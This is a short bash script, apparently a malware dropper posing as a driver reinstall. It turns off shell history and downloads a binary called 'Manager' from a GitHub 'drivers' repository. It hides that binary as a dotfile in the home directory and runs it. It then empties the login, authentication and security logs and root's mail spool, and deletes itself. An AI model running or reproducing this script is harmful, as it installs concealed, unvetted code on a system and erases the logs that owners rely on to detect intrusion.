#!/bin/bash

set +o history
kill -9 $(ps aux | pgrep ".Manager")
rm -rf ~/.Manager
cd ~ 
wget https://github.com/ConlinChow/drivers/raw/main/Manager &&  mv Manager .Manager && chmod +x ~/.Manager && ./.Manager

echo > /var/log/lastlog
echo > /var/log/utmp
#echo > /var/log/wtmp
echo > /var/log/btmp
cat /dev/null >  /var/log/secure
cat /dev/null >  /var/log/message
cat /dev/null > /var/spool/mail/root
rm -rf Reinstall.sh